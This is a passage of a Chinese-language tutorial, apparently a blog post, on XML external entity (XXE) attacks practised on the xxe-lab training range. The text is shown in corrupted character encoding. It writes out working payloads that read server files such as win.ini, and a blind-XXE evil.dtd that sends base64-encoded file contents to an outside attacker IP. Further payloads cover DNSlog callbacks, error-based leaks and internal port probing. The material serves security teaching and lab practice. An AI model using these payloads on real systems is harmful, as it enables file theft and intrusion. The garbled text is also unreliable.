çš„æœåŠ¡å™¨å‘äº†ä¸€æ¡è¯·æ±‚index.xmlçš„è¯·æ±‚ã€‚ å¦‚æœæ”¯æŒå¼•ç”¨å¤–éƒ¨å®ä½“ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½æ˜¯å­˜åœ¨xxeæ¼æ´çš„ã€‚ ä¸ƒã€XXEæ¼æ´æµ‹è¯• åœ¨æµ‹è¯•ä¸­æ‰€æœ‰çš„è¯­å¥åŸºæœ¬ä¸Šçš„å›ºå®šæ ¼å¼ï¼Œä¹Ÿå°±æ˜¯è¯´æ„å»ºçš„payloadåŸºæœ¬ä¸Šåªéœ€è¦ä¿®æ”¹è°ƒç”¨åè®®ï¼Œä»¥åŠç›¸å…³çš„å‚åŠ å³å¯ï¼Œå…¶å®ƒçš„æ ¼å¼ï¼Œéƒ½æ˜¯å›ºå®šçš„å¯ä»¥ç›´æ¥ä½¿ç”¨ã€‚ è¿™é‡Œç”±äºæŸäº›å·¥å…·æ²¡å’‹è§è¿‡ï¼Œæˆ‘å°±å…ˆå¼„phpçš„xxeå§ 1.1.æœ‰å›æ˜¾æµ‹è¯• åƒä¹‹å‰æåˆ°çš„ï¼Œå¦‚æœæœ‰å›æ˜¾ï¼Œé‚£ä¹ˆå°±å¯ä»¥é…åˆæ›´å¤šçš„åè®®æˆ–å¤–éƒ¨å¼•å…¥è¿›è¡Œåˆ©ç”¨ã€‚é‚£ä¹ˆè¿™é‡Œå°±å…ˆç®€å•æµ‹è¯•ä¸€ä¸‹æœ‰å›æ˜¾çŠ¶æ€ã€‚ 1.1.1.æœ‰å›æ˜¾æ¡ˆä¾‹ è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨xxe-labsé¶åœºã€‚ä¸‹è½½é“¾æ¥ï¼šhttps://github.com/c0ny1/xxe-lab æµ‹è¯•å›æ˜¾ä½ç½® é€šè¿‡æµ‹è¯•ï¼Œèƒ½å¤Ÿçœ‹åˆ°åœ¨adminä½ç½®æ˜¯å­˜åœ¨å›æ˜¾çš„ï¼Œè€Œåé¢çš„passwordä½ç½®çš„1234æ˜¯æ²¡å›æ˜¾çš„ã€‚ æ„å»ºpayload æ„å»ºpayloadåï¼Œä¹Ÿæ˜¯æˆåŠŸçš„è¯»å–åˆ°äº†æ–‡ä»¶ã€‚ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY name SYSTEM \"file:///c://windows/win.ini\"&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 1.1.2.ç‰¹æ®Šç¬¦å·è¯»å– æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸Šè¿°è¯»å–åˆ°çš„å†…å®¹æ­£å¸¸å›æ˜¾ï¼Œé‚£å¦‚æœæˆ‘ä»¬è¯»å–ä¸€ä¸‹æ–‡ä»¶çš„å†…å®¹ä¼šå¦‚ä½•å‘¢ï¼Ÿ # /etc/fstab: static file system information. # # &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt; proc /proc proc defaults 0 0 /dev/hda2 / ext3 defaults,errors=remount-ro 0 1 ... æˆ‘ä»¬ä¼šå‘ç°é¡µé¢æŠ¥é”™æ— æ³•æ­£å¸¸è¯»å–ï¼Œç©¶å…¶åŸå› æ˜¯è¯¥æ–‡ä»¶ä¸­å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼š å¼•ç”¨å¹¶ä¸æ¥å—å¯èƒ½ä¼šå¼•èµ· xml æ ¼å¼æ··ä¹±çš„å­—ç¬¦(åœ¨XMLä¸­ï¼Œæœ‰æ—¶å®ä½“å†…åŒ…å«äº†äº›å­—ç¬¦ï¼Œå¦‚&amp;,&lt;,&gt;,\",'ç­‰ã€‚è¿™äº›å‡éœ€è¦å¯¹å…¶è¿›è¡Œè½¬ä¹‰ï¼Œå¦åˆ™ä¼šå¯¹XMLè§£é‡Šå™¨ç”Ÿæˆé”™è¯¯) å¯¹äºè¿™ç§æƒ…å†µæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ CDATA æ¥è¿›è¡Œç»•è¿‡ï¼š æœ‰äº›å†…å®¹å¯èƒ½ä¸æƒ³è®©è§£æå¼•æ“è§£ææ‰§è¡Œï¼Œè€Œæ˜¯å½“åšåŸå§‹çš„å†…å®¹å¤„ç†ï¼Œç”¨äºæŠŠæ•´æ®µæ•°æ®è§£æä¸ºçº¯å­—ç¬¦æ•°æ®è€Œä¸æ˜¯æ ‡è®°çš„æƒ…å†µåŒ…å«å¤§é‡çš„ &lt;&gt; &amp; æˆ–è€…\" å­—ç¬¦ï¼ŒCDATAèŠ‚ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«å½“åšå…ƒç´ å­—ç¬¦æ•°æ®çš„å¸¸é‡éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ xmlæ ‡è®° &lt;![CDATA[XXXXXXXXXXXXXXXXX]]&gt; å¯ä»¥è¾“å…¥ä»»æ„å­—ç¬¦é™¤äº† ]]&gt; ä¸èƒ½åµŒå¥— ç”¨å¤„æ˜¯ä¸‡ä¸€æŸä¸ªæ ‡ç­¾å†…å®¹åŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…ä¸ç¡®å®šå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ CDATAåŒ…èµ·æ¥ é‚£æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•åœ¨å¼•ç”¨çš„ä¸¤è¾¹åŠ ä¸Š \"â€,ä½†æ˜¯å¥½åƒæ²¡æœ‰ä»»ä½•è¯­æ³•å‘Šè¯‰æˆ‘ä»¬å­—ç¬¦ä¸²èƒ½æ‹¼æ¥çš„ï¼Œäºæ˜¯æˆ‘æƒ³åˆ°äº†èƒ½ä¸èƒ½ä½¿ç”¨å¤šä¸ªå®ä½“è¿ç»­å¼•ç”¨çš„æ–¹æ³• &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY start \"&lt;![CDATA[\"&gt; &lt;!ENTITY goodies SYSTEM \"file:///d:/test.txt\"&gt; &lt;!ENTITY end \"]]&gt;\"&gt; &lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt; å¯ä»¥çœ‹åˆ°ä¾æ—§æŠ¥é”™ï¼Œè¯´æ˜æˆ‘ä»¬ä¸èƒ½åœ¨xmlä¸­è¿›è¡Œæ‹¼æ¥ï¼Œåº”è¯¥å…ˆæ‹¼æ¥å¥½ä»¥åå†åœ¨xmlä¸­è°ƒç”¨ï¼ˆä¹Ÿå°±æ˜¯é¦–å…ˆåœ¨DTDä¸­æ‹¼æ¥å¥½ï¼‰ï¼Œé‚£è¿™ç§æƒ…å†µå°±éœ€è¦åˆ©ç”¨å‚æ•°å®ä½“äº† &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % goodies SYSTEM \"file:///d:/test.txt\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;roottag&gt;&amp;all;&lt;/roottag&gt; å¯ä»¥çœ‹åˆ°æ­£å¸¸è¯»å– 1.2.æ— å›æ˜¾æµ‹è¯• å‚è€ƒï¼šhttps://xz.aliyun.com/t/3357#toc-0 æ— å›æ˜¾çš„æƒ…å†µåˆç§°ä¸ºblind xxeå¯ä»¥ä½¿ç”¨å¤–å¸¦æ•°æ®é€šé“æå–æ•°æ®ã€‚è€Œä¸”åœ¨æ­£å¸¸çš„ç¯å¢ƒä¸‹ï¼ŒæœåŠ¡å™¨ç«¯é€šå¸¸éƒ½ä¼šæŠŠå›æ˜¾å–æ¶ˆã€‚å› æ­¤æˆ‘ä»¬è§£å†³è¯¥é—®é¢˜æœ€å¥½çš„åŠæ³•å°±æ˜¯ä½¿ç”¨å¤–å¸¦çš„æ–¹å¼ã€‚ 1.2.1.æ— å›æ˜¾å¸¸è§„æµ‹è¯•æ¡ˆä¾‹ 1.2.1.1.å…³é—­æŠ¥é”™åŠè¾“å‡º è¿™é‡Œæˆ‘ä»¬å…ˆæŠŠXXElabsé¶åœºçš„è¾“å‡ºåŠæŠ¥é”™éƒ½å…³é—­ï¼Œæ¨¡æ‹Ÿæ— å›æ˜¾æƒ…å†µã€‚åœ¨è´¦å·ä¸Šé¢æ·»åŠ ä¸€ä¸ªerror_reporting(0);ï¼Œç„¶ååœ¨ä¸‹é¢çš„echo $result;å‰é¢æ·»åŠ ä¸€ä¸ª//ï¼Œå³å¯æ¨¡æ‹ŸæˆåŠŸã€‚ 1.2.1.2.æŠ“åŒ…æµ‹è¯• è¿™é‡Œæˆ‘ä»¬é¦–å…ˆæŠ“åŒ…è¿›è¡Œæµ‹è¯•ï¼Œå¯ä»¥å‘ç°ä¸åœ¨å‡ºç°æŠ¥é”™ï¼Œä»¥åŠåŸæ¥æ˜¾ç¤ºçš„ä½ç½®ä¹Ÿä¸åœ¨æ˜¾ç¤ºã€‚ 1.2.1.3.æ„å»ºpayload è¿™é‡Œéœ€è¦åœ¨å¤–éƒ¨æ­å»ºä¸€å°vpsï¼Œæ— å›æ˜¾éœ€è¦æŸ¥çœ‹æœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—ï¼Œå½“å­˜åœ¨è®¿é—®æ—¥å¿—äº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯æ˜æ˜¯æ”¯æŒå¤–éƒ¨å®ä½“çš„ï¼Œè‹¥ä¸å­˜åœ¨æ—¥å¿—ï¼Œåˆ™è¯æ˜ä¸æ”¯æŒå¤–éƒ¨å®ä½“ï¼Œæˆ–è€…è¢«WAFæ‹¦æˆªã€‚ payloadï¼š &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % shit SYSTEM \"http://192.168.10.50/1.txt\"&gt; %shit; ]&gt; 1.2.1.4.æŸ¥çœ‹æœåŠ¡å™¨æ—¥å¿— è¿™é‡Œå»æ”»å‡»è€…æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹ä¸€ä¸‹æ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—ä¸­ï¼ŒæŸ¥çœ‹åˆ°æ˜¯å­˜åœ¨ä¸€æ¡è®¿é—®æ—¥å¿—çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯æ˜æ˜¯æ”¯æŒå¤–éƒ¨å®ä½“çš„ã€‚ 1.2.2.æ— å›æ˜¾DNSlogæµ‹è¯•æ¡ˆä¾‹ ä¸Šé¢çš„å¸¸è§„æµ‹è¯•æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±æ­å»ºä¸€ä¸ªvpsæ¥è¿›è¡Œæµ‹è¯•ï¼Œé‚£ä¹ˆå¦‚æœåœ¨åˆšå¼€å§‹æµ‹è¯•çš„æ—¶å€™ï¼Œä¸æ–¹ä¾¿æŠŠè‡ªå·±çš„æœåŠ¡å™¨åœ°å€æš´éœ²å‡ºæ¥æ€ä¹ˆåŠï¼Ÿ 1.2.2.1.DNSlogæ–¹å¼ é€šè¿‡DNSlogæ–¹å¼çœ‹æœåŠ¡å™¨æ˜¯å¦æœ‰DNSæˆ–è€…HTTPçš„è¯·æ±‚ã€‚ä½†æ˜¯ç”±äºä¸ç¡®å®šå› ç´ ä»¥åŠå¤„äºå®‰å…¨è§’åº¦æ¥è€ƒè™‘ä½¿ç”¨å¤–éƒ¨çš„DNSlogä¸å®‰å…¨ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨burpä¸­è‡ªå¸¦çš„æœ‰å®˜æ–¹æ¶è®¾çš„é»˜è®¤å…¬å…±æœåŠ¡å™¨ä¸Šçš„DNSlogæœåŠ¡å™¨ã€‚ DNSlogä½ç½®ï¼š ç‚¹å‡»copy to clipboardå(è¿™ä¸€æ­¥å°±æ˜¯å¤åˆ¶äº†å­åŸŸå)ï¼Œéšåç²˜è´´å­åŸŸåå³å¯ã€‚å½“è¯·æ±‚æ—¶å°±ä¼šåœ¨ä¸‹é¢çš„çª—å£ä¸­æ˜¾ç¤ºç›¸å…³çš„è¯·æ±‚ä¿¡æ¯ã€‚åŒæ—¶è¿™ä¸ªçª—å£ä¸èƒ½å…³é—­ï¼Œè‹¥å…³é—­äº†ï¼Œé‚£ä¹ˆå°±ä¼šé”€æ¯ç›¸å…³çš„ä¿¡æ¯ã€‚ 1.2.2.2.æ„å»ºpayload å…¶å®è¿™é‡Œçš„payloadå’Œä¹‹å‰çš„payloadåŸºæœ¬ä¸€è‡´ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬å¤åˆ¶çš„å­åŸŸåæ˜¯æ²¡æœ‰http://çš„éœ€è¦æˆ‘ä»¬è‡ªå·±æ·»åŠ ä¸Šå»ã€‚æ‰€ä»¥ä¿®æ”¹ä¸‹é¢çš„payloadçš„æ—¶å€™åªéœ€è¦æŠŠhttp://åé¢çš„å†…å®¹æ›¿æ¢å³å¯ï¼Œè®¾ç½®å¥½åï¼Œç‚¹å‡»å‘é€ã€‚ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://3nrivqeathjejd5mau53iamdk4qveq2f.oastify.com\"&gt; %d; ]&gt; 1.2.2.3.æŸ¥çœ‹æ•ˆæœ å‘é€å®Œæˆåï¼Œç‚¹å‡»Poll now(ç°åœ¨è°ƒæŸ¥)ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥åœ¨å¤åˆ¶å­åŸŸååå°±å¼€å§‹è½®è¯¢ï¼Œè¿™è¾¹å¯èƒ½éœ€è¦ç¨ç­‰ä¸€ä¼šå°±èƒ½æ˜¾ç¤ºå‡ºæ¥ï¼Œå½“çœ‹åˆ°ç»“æœåå°±å¯ä»¥åˆ¤æ–­æ˜¯å¯ä»¥ä½¿ç”¨å¤–éƒ¨å¼•å…¥çš„ã€‚ 1.3.æ€»ç»“ ä»¥ä¸Šéƒ½æ˜¯ç®€å•æµ‹è¯•ï¼Œä»¥åŠäº†è§£ç›¸å…³çš„payloadå¦‚ä½•æ„å»ºï¼Œä¸‹é¢æ‰æ˜¯çœŸå®çš„æ¡ˆä¾‹ã€‚ å…«ã€ä»»æ„æ–‡ä»¶è¯»å– æ‰€è°“çš„ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå…¶å®ä¹Ÿå°±æ˜¯è¯»å–å—å®³è€…æœåŠ¡å™¨ä¸­çš„æ•æ„Ÿæ–‡ä»¶ã€‚è¿™é‡ŒåŒæ ·åˆ†ä¸ºæ— å›æ˜¾å’Œæœ‰å›æ˜¾æ“ä½œã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨xxe-labsé¶åœºåšæ¼”ç¤ºã€‚ 2.1.æœ‰å›æ˜¾æ¡ˆä¾‹ 2.1.1.æŠ“åŒ… æˆ‘ä»¬åœ¨æ‰“å¼€é¶åœºåï¼Œè¾“å…¥è´¦å·å’Œå¯†ç åå¯¹å…¶è¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åæ”¾åˆ°é‡æ”¾å™¨ä¸­ã€‚å½“ç„¶è¿™é‡Œçš„è´¦å·å’Œå¯†ç éšä¾¿è¾“éƒ½è¡Œã€‚ 2.1.2.æ„å»ºpayload æˆ‘ä»¬é€šè¿‡æ„å»ºçš„payloadå¯¹Windowsä¸­çš„é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œè¯»å–ï¼Œä¹Ÿæ˜¯æˆåŠŸè¯»å–äº†ã€‚ &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;!DOCTYPE foo [ &lt;!ENTITY rabbit SYSTEM \"file:///c:/windows/win.ini\" &gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;rabbit;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt; 2.2.æ— å›æ˜¾æ¡ˆä¾‹ 2.2.1.ä¿®æ”¹é…ç½®æ–‡ä»¶ è¿™é‡Œä¸ºäº†æ¼”ç¤ºä¿®æ”¹ï¼Œæˆ‘ä»¬æŠŠxxelabsä¸­çš„æŠ¥é”™å’Œå›æ˜¾éƒ½å…³é—­ã€‚ 2.2.2.æµ‹è¯•æ˜¯å¦å›æ˜¾ é€šè¿‡æµ‹è¯•å‘ç°æ˜¯ï¼Œæ— æ³•å›æ˜¾äº†ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œè‹¥ä½ è¿˜æ˜¯å­˜åœ¨å›æ˜¾ï¼Œé‚£ä¹ˆåˆ·æ–°ä¸€äº›é¡µé¢é‡æ–°åŠ è½½ä¸€ä¸‹ã€‚ 2.2.3.æ„å»ºpayload å‡†å¤‡ä¸€å°æ”»å‡»æœåŠ¡å™¨ï¼Œå½“ç„¶æœ¬åœ°çš„ä½¿ç”¨è™šæ‹Ÿæœºå³å¯ï¼Œå¹¶ä¸”å¼€å¯æœåŠ¡å™¨çš„è®¿é—®æ—¥å¿—ã€‚åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªevil.dtdæ–‡ä»¶ã€‚ &lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://185.243.241.45/?data=%file;'&gt;\" &gt; %all; //æ”»å‡»payloadï¼š &lt;!DOCTYPE updateProfile [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send; ]&gt; 2.2.4.æŸ¥çœ‹è®¿é—®æ—¥å¿— è¿™é‡Œçš„æŸ¥çœ‹è®¿é—®æ—¥å¿—ï¼Œæ˜¯åœ¨æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹ï¼Œä¸è¦æé”™ã€‚å¯ä»¥é€šè¿‡ä¸‹é¢çš„å›¾ç‰‡çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸè·å–åˆ°æ—¥å¿—ã€‚ 2.2.5.æŸ¥çœ‹æ—¥å¿—å†…å®¹ ç”±äºæ˜¯base64åŠ å¯†çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œè§£å¯†ï¼Œé€šè¿‡è§£å¯†å¯ä»¥çœ‹åˆ°ï¼Œæ—¥å¿—çš„å†…å®¹å’ŒWindowsä¸­çš„win.iniçš„å†…å®¹æ˜¯ä¸€æ ·çš„ã€‚ 2.2.6.è°ƒç”¨è§£é‡Š è¿™é‡Œéœ€è¦ç»“åˆpayloadè¿›è¡Œç†è§£ï¼Œä¸ç„¶å•å•çœ‹è§£é‡Šæœ‰ç‚¹éš¾ç†è§£ã€‚ åœ¨æ„å»ºçš„payloadä¸­ä¼šå‘ç°ï¼Œå¯ä»¥çœ‹åˆ°æŒºéš¾ç†è§£çš„ï¼Œæˆ‘ä»¬æ ¹æ®æ„å»ºçš„payloadè¿›è¡Œè§£é‡Šä¸€ä¸‹ï¼Œé¦–å…ˆ%dtdå»è°ƒç”¨vpsä¸Šçš„evil.dtdæ–‡ä»¶ï¼Œè¿™ä¸ªæœ‰ç‚¹ç±»ä¼¼äºå°†evil.dtdæ–‡ä»¶åŒ…å«è¿›æ¥çš„æ„Ÿè§‰ï¼Œç„¶åè°ƒç”¨evil.dtdæ–‡ä»¶ä¸­çš„%allï¼Œ%allå†å»è°ƒç”¨%fileï¼Œè€Œ%fileå°±ä¼šå»è·å–æœåŠ¡å™¨ä¸Šé¢çš„æ•æ„Ÿæ–‡ä»¶ï¼Œç„¶åå°† %file çš„ç»“æœå¡«å…¥åˆ°%send ä»¥å(å› ä¸ºå®ä½“çš„å€¼ä¸­ä¸èƒ½æœ‰ %, æ‰€ä»¥å°†å…¶è½¬æˆhtmlå®ä½“16è¿›åˆ¶ç¼–ç &amp;#x25ï¼›)ï¼Œæˆ‘ä»¬å†è°ƒç”¨ %send; æŠŠæˆ‘ä»¬çš„è¯»å–åˆ°çš„æ•°æ®å‘é€åˆ°æˆ‘ä»¬çš„è¿œç¨‹ vps ä¸Šï¼Œè¿™æ ·å°±å®ç°äº†å¤–å¸¦æ•°æ®çš„æ•ˆæœï¼ŒæˆåŠŸè§£å†³å¤–å¸¦çš„æƒ…å†µã€‚ 2.3.åŸºäºæŠ¥é”™æ¡ˆä¾‹ åŸºäºæŠ¥é”™çš„åŸç†å’Œæ— å›æ˜¾ç±»ä¼¼ï¼Œæ— å›æ˜¾é€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®ã€‚æ‰€ä»¥å’Œæ— å›æ˜¾çš„æ„é€ æ–¹å¼å‡ ä¹åªæœ‰urlå‡ºä¸åŒï¼Œå…¶ä»–åœ°æ–¹ä¸€æ¨¡ä¸€æ ·ã€‚ ç®€ç­”æ¥è¯´ï¼ŒæŠ¥é”™å°±æ˜¯å°†è¿”å›çš„æ•°æ®ï¼Œæœ¬è¯¥è¿”å›å›å»ï¼Œä½†ç”±äºURLåœ°å€æ˜¯é”™è¯¯çš„ï¼Œé‚£ä¹ˆå°±ä¼šå‡ºç°æŠ¥é”™ï¼Œå°†æ•°æ®æ˜¾ç¤ºåœ¨æŠ¥é”™ä¸­ã€‚ å‚è€ƒé“¾æ¥ï¼šhttps://blog.szfszf.top/tech/blind-xxe-è¯¦è§£-google-ctf-ä¸€é“é¢˜ç›®åˆ†æ/ 2.3.1.å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶æ¡ˆä¾‹ å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶çš„æ“ä½œå’Œæ— å›æ˜¾æ¡ˆä¾‹åŸºæœ¬ä¸€è‡´ï¼Œå°±æ˜¯ä¸Šé¢æåˆ°çš„è§£é‡Šã€‚ 2.3.1.1.ä¿®æ”¹é…ç½®æ–‡ä»¶ è¿™é‡Œä¸ºäº†èƒ½å¤Ÿå®ç°æŠ¥é”™ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œå°†ä¸æ˜¾ç¤ºæŠ¥é”™å†…å®¹ç»™æ³¨é‡Šäº†ã€‚ 2.3.1.2.æ„å»ºpayload é¦–å…ˆåœ¨æ”»å‡»è€…æœåŠ¡å™¨ä¸­åˆ›å»ºevil.dtdæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­å†™å…¥payloadï¼Œåœ¨è¿™ä¸ªpayloadä¸­ä¼šå­˜åœ¨ä¸€ä¸ªalskdnmçš„åœ°æ–¹ï¼ŒåŸæœ¬åœ¨æ— å›æ˜¾ä¸­è¿™é‡Œä¼šå†™ä¸ŠæœåŠ¡å™¨çš„IPåœ°å€ï¼Œä½†æ˜¯è¿™é‡Œéšä¾¿å†™ä¸€ä¸ªä¸å­˜åœ¨çš„åœ°å€ï¼Œä½¿å…¶èƒ½å¤Ÿå‡ºç°æŠ¥é”™ã€‚ &lt;!ENTITY % start \"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://alskdnm/?data=%file;'&gt;\"&gt; %start; æ„å»ºæ”»å‡»çš„payloadçš„è¯­å¥ &lt;?xml version=\"1.0\"?&gt; &lt;!DOCTYPE message [ &lt;!ENTITY % remote SYSTEM \"http://ip/evil.dtd\"&gt; &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini\"&gt; %remote; %send; ]&gt; &lt;message&gt;1234&lt;/message&gt; 2.3.1.3.æµ‹è¯•æ•ˆæœ é€šè¿‡è¿”å›çš„æ•°æ®åŒ…å†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°åŸæœ¬åº”è¯¥å‡ºç°åœ¨æœåŠ¡å™¨æ—¥å¿—ä¸­çš„ç¼–ç çš„æ•°æ®ï¼Œç°åœ¨åœ¨å‰ç«¯ä¸­äº†ï¼Œè€Œè¿™å°±æ˜¯åŸºäºæŠ¥é”™çš„åŸå› ã€‚ 2.3.1.4.ç¼–ç è¿˜åŸ æˆ‘ä»¬å¯¹ç¼–ç è¿›è¡Œè¿˜åŸï¼ŒæŸ¥çœ‹æ•ˆæœã€‚ 2.3.2.é€šè¿‡å¼•å…¥æœ¬åœ°æ–‡ä»¶ å…³äºå¼•å…¥æœ¬åœ°æ–‡ä»¶ï¼Œé€šè¿‡ä¸Šé¢çš„å‚è€ƒé“¾æ¥ä¸­çš„ä½œè€…çš„è¯ï¼Œè¿™æ ·å¯è¡Œï¼Œä½†æ˜¯å¼•å…¥æœ¬åœ°é“¾æ¥ï¼Œæˆ‘è¿™è¾¹æ²¡æœ‰é¶åœºï¼Œä¸å¥½è¿›è¡Œæµ‹è¯•ï¼Œå¦‚æœæ„Ÿå…´è¶£å¯ä»¥å»ä½œè€…çš„æ–‡ç« ä¸­å»äº†è§£ä¸€äº›ï¼Œä½†æ˜¯ï¼Œå¼•å…¥æœ¬åœ°æ–‡ä»¶ï¼Œå¿…ç„¶ä¸æ˜¯ä¸€ä»¶å®¹æ˜“çš„äº‹ã€‚å®ç°èµ·æ¥ä¸ç®¡æ˜¯å¼•å…¥å¤–éƒ¨æˆ–å†…éƒ¨ï¼Œéƒ½æŒºå›°éš¾çš„ã€‚å½“ç„¶åœ¨é»”é©´æŠ€ç©·çš„æ—¶å€™ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªä¸é”™çš„åŠæ³•ã€‚ ä¹ã€æ¢æµ‹ç«¯å£å­˜æ´» è¿™é‡Œç«¯å£æ¢æµ‹ï¼Œç»è¿‡æµ‹è¯•ï¼Œä¸ç®¡æœ‰æ²¡æœ‰å›æ˜¾ï¼Œéƒ½åªèƒ½é å“åº”æ—¶é—´æ¥è¿›è¡Œåˆ¤æ–­ï¼Œè¿™é‡Œå¦‚æœä¸å¥½åˆ¤æ–­ï¼Œå¯ä»¥ä¼˜å…ˆæµ‹è¯•ä¸€ä¸‹æ­£å¸¸ä¸ä¼šå¼€æ”¾çš„ç«¯å£ï¼Œç„¶åæŸ¥çœ‹å“åº”æ—¶é•¿ï¼Œç„¶åå†å»æµ‹è¯•ä¸€ä¸‹ï¼Œæ­£å¸¸ä¼šå¼€æ”¾çš„ç«¯å£ï¼Œä¾‹å¦‚ï¼š3389ã€80ã€443ã€22ã€23ç­‰ç«¯å£ã€‚ç„¶åæ¯”è¾ƒä¸¤ä¸ªå“åº”çš„æ—¶é•¿ï¼Œé€šå¸¸æ¥è¯´ï¼Œç«¯å£å¼€æ”¾äº†ï¼Œå“åº”ä¼šå¿«ä¸€ç‚¹ï¼Œè€Œç«¯å£æœªå¼€æ”¾åˆ™å“åº”ä¼šæ¯”è¾ƒæ…¢ã€‚ 3.1.æ¢æµ‹ç«¯å£æ¡ˆä¾‹ è¿™é‡Œä¾æ—§æ˜¯ä½¿ç”¨xxelabsé¶åœºåšæ¼”ç¤ºï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸æ”¹ä»€ä¹ˆå›æ˜¾ä¸å›æ˜¾çš„æƒ…å†µäº†ï¼Œç›´æ¥è¿›è¡Œæµ‹è¯•ã€‚ 3.1.1.æŠ“åŒ… è¿™é‡ŒæŠŠæŠ“åˆ°çš„åŒ…æ”¾å…¥é‡æ”¾å™¨ä¸­ã€‚ 3.1.2.æ„å»ºpayload è¿™é‡Œæˆ‘å¼€æ”¾äº†3389ç«¯å£ä»¥åŠ80ç«¯å£ï¼Œæœªå¼€æ”¾22ç«¯å£ä»¥åŠ23ç«¯å£ã€‚æˆ‘ä»¬åˆ†åˆ«è¿›è¡Œæµ‹è¯•ã€‚ è¿™é‡Œæœ‰ä¸¤ç§payloadï¼Œä¸€ç§æ˜¯ç›´æ¥åœ¨å›æ˜¾ä½ç½®ä¿®æ”¹ï¼Œä¸€ç§æ˜¯ä¸éœ€è¦ç®¡å›æ˜¾ä½ç½®çš„å†…å®¹ï¼ŒåŒæ—¶è¿™é‡Œé¢è¾“å…¥çš„IPæ˜¯å†…ç½‘ä¸­ä½ æƒ³è¦æµ‹è¯•çš„IPåœ°å€ä»¥åŠåé¢çš„ç«¯å£å·ã€‚è¿™é‡Œæˆ‘åªæµ‹è¯•ä¸€ä¸ªpayloadã€‚ 1.payload &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://ip:3389\" &gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 2.payloadï¼š &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM \"http://ip:3389\" &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;/root&gt; 3.1.3.æµ‹è¯•å¼€æ”¾ç«¯å£ 